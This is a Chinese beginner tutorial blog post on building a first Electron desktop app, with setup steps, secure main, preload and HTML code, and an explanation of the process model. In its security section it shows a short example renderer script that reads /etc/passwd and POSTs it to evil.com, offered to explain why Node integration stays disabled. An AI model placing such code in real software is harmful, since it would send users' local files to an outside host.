# Electron 入门完全指南：30分钟搭建你的第一个跨平台桌面应用

> **阅读时长**：约 15 分钟 | **难度**：⭐ 入门 | **本系列**：L1/Day 1

你有没有想过，VS Code、Discord、Slack、Figma、Obsidian 这些国民级桌面应用，底层用的竟然是同一套技术？没错，它们都是用 **Electron** 构建的。今天我们就来揭开 Electron 的面纱，从零开始搭建第一个跨平台桌面应用。

---

## 一、Electron 到底是什么？

### 1.1 一句话理解 Electron

**Electron = Chromium（浏览器内核）+ Node.js（运行时）**

这意味着你可以用 HTML/CSS/JavaScript 构建界面，同时拥有 Node.js 的全部能力——读写文件、调用系统 API、执行命令行……所有这些打包成一个安装文件，用户双击就能在 Windows、macOS、Linux 上运行。

### 1.2 主流 Electron 应用一览

你可能每天都在用 Electron 应用，只是不知道而已：

| 应用 | 用途 | 特点 |
|:---|:---|:---|
| [VS Code](https://github.com/microsoft/vscode) | 代码编辑器 | 性能优化典范，~400MB 内存控制 |
| [Discord](https://github.com/discord/discord) | 社交/游戏语音 | 实时通信 + 音视频 |
| [Slack](https://slack.com/) | 企业协作 | 多工作区切换 |
| [Figma](https://www.figma.com/) | 在线设计工具 | 原生渲染 + Web UI 混合 |
| [Obsidian](https://github.com/obsidianmd/obsidian-md) | 知识管理笔记 | 轻量级标杆，启动快 |
| [Notion](https://www.notion.so/) | 笔记/协作 | 富文本编辑器 |
| [Postman](https://www.postman.com/) | API 调试 | 开发者必备工具 |
| [Bitwarden](https://github.com/bitwarden/clients) | 密码管理器 | 安全 + 跨平台同步 |

### 1.3 Electron vs 其他跨平台方案

| 方案 | 语言 | 包体积 | 内存占用 | 生态成熟度 |
|:---|:---|:---|:---|:---:|
| **Electron** | JS/TS | ~150MB+ | 高（200MB+） | ★★★★★ |
| Tauri 2.0 | Rust + 前端 | ~5MB | 低（~30MB） | ★★★☆☆ |
| Flutter Desktop | Dart | ~50MB | 中 | ★★★★☆ |
| .NET MAUI | C#/XAML | ~80MB | 中 | ★★★☆☆ |

> **怎么选？** 如果你团队擅长 JavaScript/TypeScript，或者需要丰富的 Web 生态支持，Electron 仍然是最佳选择。虽然"重"，但成熟稳定，社区资源丰富。

---

## 二、环境准备

### 2.1 前置要求

- **Node.js** >= 18 LTS（推荐 20+）
- **npm** >= 9 或 **pnpm** >= 8
- 一个代码编辑器（推荐 VS Code）

检查环境：

```bash
node -v    # 应显示 v18.0.0 或更高
npm -v     # 应显示 9.0.0 或更高
```

> 💡 **为什么要求 Node 18？** Electron 28+ 内置的 Node.js 版本基于 18.x，保持一致可以避免很多奇奇怪怪的兼容问题。

### 2.2 推荐的开发工具

```bash
# VS Code 安装以下扩展（强烈推荐）
# - ES7+ React/Redux/React-Native snippets（代码补全）
# - Electron（官方调试支持）
# - Prettier（代码格式化）
```

---

## 三、创建第一个 Electron 应用

我们提供两种方式：快速脚手架和手动创建。建议初学者两种都试试，手动创建能帮你真正理解原理。

### 方式一：electron-vite 快速脚手架（推荐）

[electron-vite](https://electron-vite.org/) 是目前最好的 Electron 开发构建工具，它整合了 Vite 的极速热更新和 Electron 的进程管理。

```bash
# 使用 npm create 创建项目
npm create electron-app@latest my-first-electron-app -- --template=vite-typescript

cd my-first-electron-app
npm run dev
```

几秒钟后，你应该能看到一个窗口弹出来——恭喜，你的第一个 Electron 应用跑起来了！

生成的项目结构：

```
my-first-electron-app/
├── electron.vite.config.ts    # electron-vite 配置
├── package.json               # 项目配置和脚本
├── tsconfig.json              # TypeScript 配置
└── src/
    ├── main/                  # 📦 主进程
    │   └── index.ts           #   主入口
    ├── preload/               # 🔗 预加载脚本
    │   └── index.ts           #   安全桥梁
    └── renderer/              # 🖥️ 渲染进程（前端）
        ├── src/
        │   ├── App.tsx        #   React 根组件
        │   └── main.tsx       #   前端入口
        └── index.html         #   HTML 模板
```

### 方式二：从零手动创建（理解本质）

如果你想彻底搞懂 Electron 的运作方式，跟着我一步步来：

#### Step 1：初始化项目

```bash
mkdir my-electron-manual && cd my-electron-manual
npm init -y
```

#### Step 2：安装 Electron

```bash
npm install electron --save-dev
```

#### Step 3：编写核心三件套

Electron 应用的最小结构只需要三个文件：

**① `main.js` — 主进程（大脑）**

主进程是整个应用的"指挥官"，负责创建窗口、管理系统事件、协调各个渲染进程：

```javascript
// main.js
const { app, BrowserWindow } = require('electron');
const path = require('path');

// 创建窗口的函数
function createWindow() {
  const mainWindow = new BrowserWindow({
    width: 1000,                    // 窗口宽度
    height: 700,                    // 窗口高度
    webPreferences: {
      // ⚠️ 安全关键配置！后面会详细讲
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,       // 隔离上下文
      nodeIntegration: false,       // 禁止渲染进程直接使用 Node
    },
  });

  // 加载页面（开发模式）
  mainWindow.loadFile('index.html');
  
  // 开发模式下打开 DevTools（生产环境要删掉这行！）
  if (!app.isPackaged) {
    mainWindow.webContents.openDevTools();
  }
}

// Electron 生命周期：app 就绪后创建窗口
app.whenReady().then(() => {
  createWindow();

  // macOS 特有行为：点击 Dock 图标时重新打开窗口
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

// 所有窗口关闭时退出应用（macOS 除外）
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
```

**② `preload.js` — 预加载脚本（安全桥梁）**

这是 Electron 安全模型中最关键的一环。它运行在一个独立的环境中，可以同时访问 Node.js API 和浏览器 DOM API，并通过 `contextBridge` 将安全的接口暴露给渲染进程：

```javascript
// preload.js
const { contextBridge, ipcRenderer } = require('electron');

// 通过 contextBridge 向渲染进程暴露安全 API
contextBridge.exposeInMainWorld('electronAPI', {
  // 平台信息（只读，安全）
  platform: process.platform,
  
  // 版本信息
  versions: {
    node: process.versions.node,
    chrome: process.versions.chrome,
    electron: process.versions.electron,
  },
  
  // 发送消息到主进程（白名单机制）
  send: (channel, data) => {
    const allowedChannels = ['toMain'];
    if (allowedChannels.includes(channel)) {
      ipcRenderer.send(channel, data);
    }
  },
  
  // 接收主进程消息（白名单机制）
  on: (channel, callback) => {
    const allowedChannels = ['fromMain'];
    if (allowedChannels.includes(channel)) {
      ipcRenderer.on(channel, (event, ...args) => callback(...args));
    }
  },
});
```

> 🔒 **安全提示**：绝对不要把 `require`、`ipcRenderer` 直接暴露给渲染进程！这就是 `nodeIntegration: false` + `contextIsolation: true` 存在的意义。Obsidian、VS Code 都严格遵循这个原则。

**③ `index.html` — 用户界面**

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'">
  <title>我的第一个 Electron 应用</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    .container {
      text-align: center;
      padding: 40px;
      background: rgba(255,255,255,0.15);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.1);
    }
    
    h1 { font-size: 2em; margin-bottom: 16px; }
    p { opacity: 0.9; margin-bottom: 24px; }
    
    .info-card {
      background: rgba(255,255,255,0.1);
      border-radius: 12px;
      padding: 16px 24px;
      margin-top: 20px;
      text-align: left;
      font-family: 'Monaco', 'Consolas', monospace;
      font-size: 14px;
    }
    
    .info-card code { color: #ffd700; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🚀 Hello Electron!</h1>
    <p>你的第一个跨平台桌面应用已成功运行</p>
    
    <div id="app-info" class="info-card">
      正在获取系统信息...
    </div>
  </div>

  <script>
    // 通过预加载脚本暴露的安全 API 获取信息
    document.addEventListener('DOMContentLoaded', () => {
      if (window.electronAPI) {
        const info = window.electronAPI;
        document.getElementById('app-info').innerHTML = `
          <div><strong>📌 操作系统：</strong><code>${info.platform}</code></div>
          <div style="margin-top:8px"><strong>⚡ Node.js：</strong><code>${info.versions.node}</code></div>
          <div style="margin-top:8px"><strong>🌐 Chrome：</strong><code>${info.versions.chrome}</code></div>
          <div style="margin-top:8px"><strong>📦 Electron：</strong><code>${info.versions.electron}</code></div>
        `;
      } else {
        document.getElementById('app-info').textContent = 
          '⚠️ 未检测到 electronAPI，请检查 preload 配置';
      }
    });
  </script>
</body>
</html>
```

#### Step 4：添加启动脚本

编辑 `package.json`，添加 start 命令：

```json
{
  "name": "my-electron-manual",
  "version": "1.0.0",
  "main": "main.js",
  "scripts": {
    "start": "electron ."
  },
  "devDependencies": {
    "electron": "^33.0.0"
  }
}
```

#### Step 5：运行！

```bash
npm start
```

你会看到一个漂亮的渐变背景窗口，显示着当前系统的 Electron 版本信息。这就是一个真正的跨平台桌面应用了！

---

## 四、核心概念深度解析

### 4.1 进程架构图解

理解 Electron 的进程模型是进阶的关键：

```
┌─────────────────────────────────────────────────────┐
│                   Electron 应用                       │
│                                                       │
│  ┌─────────────────────────────────────────────┐     │
│  │            Main Process (主进程)               │     │
│  │                                              │     │
│  │  • 创建和管理窗口                             │     │
│  │  • 处理系统级事件（菜单、托盘、通知）            │     │
│  │  • 文件系统 / 网络 / 数据库操作                │     │
│  │  • 协调各渲染进程                              │     │
│  │                                              │     │
│  │  运行时：Node.js 完整能力                      │     │
│  └──────────┬──────────────────────┬────────────┘     │
│             │ preload.js           │ preload.js        │
│             │ （安全桥梁）          │ （安全桥梁）        │
│             ▼                      ▼                   │
│  ┌──────────────────┐  ┌──────────────────┐          │
│  │ Renderer Process │  │ Renderer Process │          │
│  │   (窗口 A)        │  │   (窗口 B)        │          │
│  │                  │  │                  │          │
│  │  运行时：Chromium  │  │  运行时：Chromium │          │
│  │  只能通过 preload │  │  只能通过 preload │          │
│  │  访问受限 API     │  │  访问受限 API     │          │
│  └──────────────────┘  └──────────────────┘          │
└─────────────────────────────────────────────────────┘
```

### 4.2 为什么需要这种架构？

想象一下，如果渲染进程（即网页）能直接访问你的文件系统：

```html
<!-- ❌ 危险！如果开启了 nodeIntegration -->
<script>
  // 恶意网页可以读取你电脑上的任意文件！
  const fs = require('fs');
  const data = fs.readFileSync('/etc/passwd', 'utf-8');
  fetch('http://evil.com/steal', { method: 'POST', body: data });
</script>
```

这就是为什么现代 Electron 强制使用：
- **contextIsolation: true** — 将渲染进程的 JS 运行在隔离环境中
- **nodeIntegration: false** — 禁止渲染进程直接使用 require
- **preload + contextBridge** — 以白名单方式精确控制可暴露的 API

### 4.3 各组件职责速查表

| 组件 | 运行环境 | 能做什么 | 不能做什么 |
|:---|:---|:---|:---|
| **main.js** | Node.js | 创建窗口、调用所有 Electron/Node API、读写文件 | 操作 DOM |
| **preload.js** | 隔离环境 | 同时访问 Node 和有限的浏览器 API | 不应包含大量业务逻辑 |
| **index.html** | Chromium | 普通 Web 开发（DOM、CSS、网络请求） | 不能直接 require Node 模块 |

---

## 五、常见问题 FAQ

### Q1：Electron 应用是不是很吃内存？

确实比原生应用占内存多，因为每个窗口都会附带完整的 Chromium 渲染引擎。但别被吓到：

- **VS Code** 通过大量优化将内存控制在合理范围
- **Obsidian** 作为轻量级代表，空闲时仅占 ~100MB
- 后续 L5 阶段我们会专门讲性能优化技巧

### Q2：开发完如何打包分发给用户？

使用 [electron-builder](https://www.electron.build/) 可以一键打包成：
- Windows: `.exe` 安装包 / `.exe` 便携版
- macOS: `.dmg` / `.zip`
- Linux: `.AppImage` / `.deb` / `.rpm`

这个内容会在 **L6（安全、打包与分发）** 详细讲解。

### Q3：可以用 React/Vue/Angular 吗？

当然可以！而且这是主流做法。渲染进程就是一个普通的网页，你想用什么前端框架都行。后续 Day 3 我们会详细讲解框架集成。

### Q4：Electron 和网页有什么区别？

| 能力 | 普通网页 | Electron |
|:---|:---|:---|
| 访问本地文件系统 | ❌ 受限 | ✅ 完全访问 |
| 调用系统原生功能 | ❌ | ✅ 托盘、通知、快捷键等 |
| 窗口控制 | ❌ 浏览器决定 | ✅ 自定义大小、位置、样式 |
| 打包分发 | ❌ 需要服务器 | ✅ 独立安装程序 |
| 自动更新 | ❌ | ✅ 内置支持 |
| 跨平台 | ✅ 但依赖浏览器 | ✅ 原生体验一致 |

---

## 六、今日总结与下一步

✅ 今天我们完成了：

1. **认识 Electron** — 了解它是什么、谁在用、和其他方案的对比
2. **环境搭建** — Node.js + 编辑器 + 工具链
3. **两种方式创建项目** — electron-vite 脚手架 vs 手动三件套
4. **理解核心架构** — 主进程、渲染进程、preload 的角色和安全模型
5. **运行第一个应用** — 看到了实实在在的窗口！

### 下节预告：Day 2 — Preload 与 IPC 通信实战

明天我们将深入：
- Preload 脚本的高级用法（Obsidian 级别的安全实践）
- 渲染进程 ↔ 主进程的完整通信机制
- 用 TypeScript 重构代码，获得完整类型提示
- 动手做一个"文件读取器"小工具

---

> 💬 **有问题或想法？** 欢迎在评论区交流讨论！
> 
> 👨‍💻 **本系列持续更新中**，关注「APP移动开发」公众号获取后续教程。
> ❤️ 觉得有用？点个"在看"分享给更多想学 Electron 的朋友！
